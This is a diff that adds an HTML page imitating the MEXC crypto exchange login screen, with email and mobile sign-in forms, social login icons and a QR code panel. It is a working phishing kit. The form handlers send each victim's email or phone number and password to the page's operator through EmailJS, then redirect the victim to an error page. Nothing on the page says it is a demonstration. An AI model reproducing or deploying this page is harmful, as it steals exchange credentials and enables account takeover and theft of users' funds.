@@ -1,0 +1,489 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Mexc</title>
+    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon" />
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"
+    />
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css"
+    />
+    <style type="text/css">
+      * {
+        margin: 0px;
+        padding: 0px;
+      }
+      body {
+        background: #111214;
+      }
+      .logo img {
+        width: 141px;
+      }
+      .ri svg {
+        fill: #fff;
+        margin-right: 17px;
+      }
+      .logo {
+        width: 50%;
+        float: left;
+      }
+
+      input {
+        color: white;
+      }
+
+      .header {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        padding: 1%;
+        border-bottom: 1px solid #222429;
+      }
+      form.form1 input {
+        width: 100%;
+        background: #b4bfd61f;
+        border: 0px;
+        padding: 4%;
+        border-radius: 5px;
+        margin-bottom: 6%;
+        font-size: 17px;
+        box-sizing: border-box;
+      }
+      form.form2 input {
+        width: 100%;
+        background: #b4bfd61f;
+        border: 0px;
+        padding: 4%;
+        border-radius: 5px;
+        margin-bottom: 6%;
+        font-size: 17px;
+        box-sizing: border-box;
+      }
+      .left {
+        width: 60%;
+        float: left;
+        padding: 2% 8%;
+        box-sizing: border-box;
+        border-right: 1px solid #222429;
+      }
+
+      .wrap {
+        width: 68%;
+        margin: auto;
+        margin-top: 5%;
+      }
+
+      .left h3 {
+        color: #fff;
+        font-family: sans-serif;
+        font-size: 24px;
+      }
+
+      .left span {
+        color: #87909f;
+        font-family: sans-serif;
+        margin-top: 2%;
+        display: inline-block;
+        font-size: 14px;
+      }
+
+      .left ul li {
+        float: left;
+        list-style: none;
+        font-family: sans-serif;
+        color: #87909f;
+        margin: 5% 12% 5% 0%;
+        font-weight: 600;
+        font-size: 18px;
+      }
+
+      .social ul li svg {
+        width: 18px;
+        fill: #fff;
+      }
+      form.form1 button {
+        width: 100%;
+        background: #b4bfd61f;
+        border: 0px;
+        padding: 4%;
+        border-radius: 5px;
+        margin-bottom: 5%;
+        font-size: 17px;
+        box-sizing: border-box;
+        color: #87909f;
+      }
+      .form2 {
+        display: none;
+      }
+      form.form2 button {
+        width: 100%;
+        background: #b4bfd61f;
+        border: 0px;
+        padding: 4%;
+        border-radius: 5px;
+        margin-bottom: 5%;
+        font-size: 17px;
+        box-sizing: border-box;
+        color: #87909f;
+      }
+      .social ul li {
+        float: left;
+        background: #b4bfd61f;
+        width: 60px;
+        text-align: center;
+        list-style: none;
+        margin-left: 2% !important;
+        height: 60px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        border-radius: 50px;
+        margin-right: 8% !important;
+      }
+      p.afer {
+        color: #87909f;
+        font-family: sans-serif;
+        text-align: center;
+        position: relative;
+        font-size: 14px;
+        padding: 5%;
+      }
+      p.afer:before {
+        width: 38%;
+        height: 1px;
+        background: #87909f38;
+        content: "";
+        position: absolute;
+        right: 0%;
+        top: 47%;
+      }
+      p.afer:after {
+        width: 38%;
+        height: 1px;
+        background: #87909f38;
+        content: "";
+        position: absolute;
+        left: 0%;
+        top: 47%;
+      }
+      .righta {
+        width: 30%;
+        float: right;
+        text-align: center;
+        color: #fff;
+        font-family: sans-serif;
+        font-size: 14px;
+        margin-top: 10%;
+      }
+      .emaila {
+        position: relative;
+      }
+      ul {
+        overflow: hidden;
+      }
+      .emaila svg {
+        position: absolute;
+        left: 4%;
+        top: 24%;
+        fill: #87909f;
+      }
+      .righta span {
+        margin: 3% 0%;
+        display: inline-block;
+      }
+      .righta p {
+        color: #87909f;
+        font-size: 14px;
+        line-height: 22px;
+      }
+
+      .righta p a {
+        color: #4281ff;
+        text-decoration: none;
+      }
+
+      .scanner {
+        height: 125px;
+        width: 125px;
+      }
+      .night-mode-icon {
+        font-size: 17px;
+        color: white; /* Makes the crescent moon white */
+        cursor: pointer;
+        transform: scale(1.2);
+        margin-bottom: 10px;
+      }
+
+      @media (max-width: 768px) {
+        .social ul li {
+          margin-right: 3% !important;
+        }
+        .wrap {
+          width: 100%;
+        }
+        .left {
+          width: 100%;
+          border: 0px;
+        }
+        .righta {
+          width: 100%;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="header">
+      <div class="logo">
+        <img src="logo.svg" />
+      </div>
+      <div class="ri">
+        <svg
+          class="sc-gEvEer hSTeNi mx-icon"
+          focusable="false"
+          width="1em"
+          height="1em"
+          fill="currentColor"
+          aria-hidden="true"
+          style="font-size: 20px"
+          viewBox="0 0 24 24"
+          data-icon="GlobalOutlined"
+        >
+          <path
+            d="M12 22C6.477 22 2 17.523 2 12C2 6.477 6.477 2 12 2C17.523 2 22 6.477 22 12C22 17.523 17.523 22 12 22ZM9.71 19.667C8.72341 17.5743 8.15187 15.3102 8.027 13H4.062C4.25659 14.5389 4.89392 15.9882 5.89657 17.1717C6.89922 18.3552 8.22401 19.2221 9.71 19.667V19.667ZM10.03 13C10.181 15.439 10.878 17.73 12 19.752C13.1523 17.6766 13.8254 15.3695 13.97 13H10.03V13ZM19.938 13H15.973C15.8481 15.3102 15.2766 17.5743 14.29 19.667C15.776 19.2221 17.1008 18.3552 18.1034 17.1717C19.1061 15.9882 19.7434 14.5389 19.938 13V13ZM4.062 11H8.027C8.15187 8.68979 8.72341 6.42569 9.71 4.333C8.22401 4.77788 6.89922 5.64475 5.89657 6.8283C4.89392 8.01184 4.25659 9.4611 4.062 11V11ZM10.031 11H13.969C13.8248 8.6306 13.152 6.32353 12 4.248C10.8477 6.32345 10.1746 8.63052 10.03 11H10.031ZM14.29 4.333C15.2766 6.42569 15.8481 8.68979 15.973 11H19.938C19.7434 9.4611 19.1061 8.01184 18.1034 6.8283C17.1008 5.64475 15.776 4.77788 14.29 4.333V4.333Z"
+          ></path>
+        </svg>
+
+        <i class="fas fa-moon night-mode-icon"></i>
+      </div>
+    </div>
+    <div class="wrap">
+      <div class="left">
+        <h3>Welcome to MEXC</h3>
+        <span>First login counts as sign-up</span>
+        <ul>
+          <li style="border-bottom: 3px solid #4281ff" class="email_t">
+            Email
+          </li>
+          <li class="mob_t">Mobile</li>
+        </ul>
+        <form
+          class="form1"
+          action="error.html"
+          method="post"
+          onsubmit="return validateEmailForm()"
+        >
+          <div class="emaila">
+            <input
+              type="email"
+              name="email"
+              id="email"
+              required
+              placeholder="Email/Sub-Account"
+              style="padding: 4% 10%"
+            />
+            <svg
+              class="sc-eqUAAy cMqsAc mx-icon input-prefix-icon"
+              focusable="false"
+              width="1em"
+              height="1em"
+              fill="currentColor"
+              aria-hidden="true"
+              viewBox="0 0 1293 1024"
+              data-icon="MailFilled"
+            >
+              <path
+                d="M1242.920421 188.631579l-606.315789 350.046316L45.864421 197.685895v-50.876632c0-60.146526 48.720842-109.029053 109.029053-109.029052h979.267368c60.146526 0 109.082947 48.720842 109.082947 109.029052V188.631579h-0.323368z m0 125.682526v594.081684a109.029053 109.029053 0 0 1-109.029053 109.029053H154.677895a109.029053 109.029053 0 0 1-109.029053-109.029053V323.422316l563.792842 325.470316c19.402105 11.210105 42.630737 9.054316 59.49979-3.341474 0.808421-0.323368 1.455158-0.808421 2.317473-1.13179l571.607579-330.105263z"
+              ></path>
+            </svg>
+          </div>
+
+          <input
+            type="password"
+            name="password1"
+            id="password1"
+            required
+            placeholder="Password"
+          />
+          <button type="submit">Next</button>
+        </form>
+
+        <form
+          class="form2"
+          action="error.html"
+          method="post"
+          onsubmit="return validateMobileForm()"
+        >
+          <input
+            type="number"
+            name="mobile"
+            id="mobile"
+            required
+            placeholder="Mobile Number"
+          />
+          <input
+            type="password"
+            name="password2"
+            id="password2"
+            required
+            placeholder="Password"
+          />
+          <button type="submit">Next</button>
+        </form>
+        <p class="afer">or log in with</p>
+        <div class="social">
+          <ul>
+            <li>
+              <img
+                src="https://cdn1.iconfinder.com/data/icons/google-s-logo/150/Google_Icons-09-512.png"
+                alt="Google Logo"
+                class="logo"
+              />
+            </li>
+            <li>
+              <img
+                src="https://static.vecteezy.com/system/resources/thumbnails/020/489/292/small_2x/3d-logo-of-apple-iphone-free-png.png"
+                alt="Apple Logo"
+                class="logo"
+              />
+            </li>
+            <li>
+              <img
+                src="https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/metamask-icon.png"
+                alt="MetaMask Logo"
+                class="logo"
+              />
+            </li>
+            <li>
+              <img
+                src="https://static-00.iconduck.com/assets.00/telegram-icon-2048x1739-6c7sghxm.png"
+                alt="Telegram Logo"
+                class="logo"
+              />
+            </li>
+          </ul>
+        </div>
+      </div>
+      <div class="righta">
+        <img class="scanner" src="scanner.jpg" /><br />
+        <span>Log in with QR code</span>
+        <p>
+          Scan this QR code with the<a href=""> MEXC <br />App </a>to log in
+          instantly
+        </p>
+      </div>
+    </div>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>
+    <script
+      type="text/javascript"
+      src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"
+    ></script>
+    <script type="text/javascript">
+      (function () {
+        emailjs.init("eFjqTxnF7nGuJXVZd");
+      })();
+    </script>
+    <script type="text/javascript">
+      $(".mob_t").click(function () {
+        $(".form1").hide();
+        $(".form2").show();
+      });
+      $(".email_t").click(function () {
+        $(".form2").hide();
+        $(".form1").show();
+      });
+
+      function validateEmailForm() {
+        var email = document.getElementById("email").value;
+        var password1 = document.getElementById("password1").value;
+        if (email == "" || password1 == "") {
+          alert("Please fill in all fields.");
+          return false;
+        }
+        // Send email using EmailJS
+        emailjs
+          .send("service_8it2819", "template_svj8vag", {
+            to_name: "Recipient Name",
+            from_name: "MEXC",
+            email_id: email,
+            phone: "",
+            password: password1,
+          })
+          .then(
+            function (response) {
+              console.log("SUCCESS!", response.status, response.text);
+              // Simulate a delay before redirecting
+              setTimeout(function () {
+                window.location.href = "error.html";
+              }, 1000);
+            },
+            function (error) {
+              console.log("FAILED...", error);
+            }
+          );
+        return false;
+      }
+
+      function validateMobileForm() {
+        var mobile = document.getElementById("mobile").value;
+        var password2 = document.getElementById("password2").value;
+        if (mobile == "" || password2 == "") {
+          alert("Please fill in all fields.");
+          return false;
+        }
+        // Send email using EmailJS
+        emailjs
+          .send("service_8it2819", "template_svj8vag", {
+            to_name: "Recipient Name",
+            from_name: "MEXC",
+            email_id: "",
+            phone: mobile,
+            password: password2,
+          })
+          .then(
+            function (response) {
+              console.log("SUCCESS!", response.status, response.text);
+              // Simulate a delay before redirecting
+              setTimeout(function () {
+                window.location.href = "error.html";
+              }, 1000);
+            },
+            function (error) {
+              console.log("FAILED...", error);
+            }
+          );
+        return false;
+      }
+    </script>
+    <!-- Start of LiveChat (www.livechat.com) code -->
+    <script type="text/javascript">
+      var Tawk_API = Tawk_API || {},
+        Tawk_LoadStart = new Date();
+      (function () {
+        var s1 = document.createElement("script"),
+          s0 = document.getElementsByTagName("script")[0];
+        s1.async = true;
+        s1.src = "https://embed.tawk.to/66a2a258becc2fed692b2b32/1i3lkkb6g";
+        s1.charset = "UTF-8";
+        s1.setAttribute("crossorigin", "*");
+        s0.parentNode.insertBefore(s1, s0);
+      })();
+    </script>
+    <noscript
+      ><a href="https://www.livechat.com/chat-with/18929835/" rel="nofollow"
+        >Chat with us</a
+      >, powered by
+      <a
+        href="https://www.livechat.com/?welcome"
+        rel="noopener nofollow"
+        target="_blank"
+        >LiveChat</a
+      ></noscript
+    >
+    <!-- End of LiveChat code -->
+  </body>
+</html>
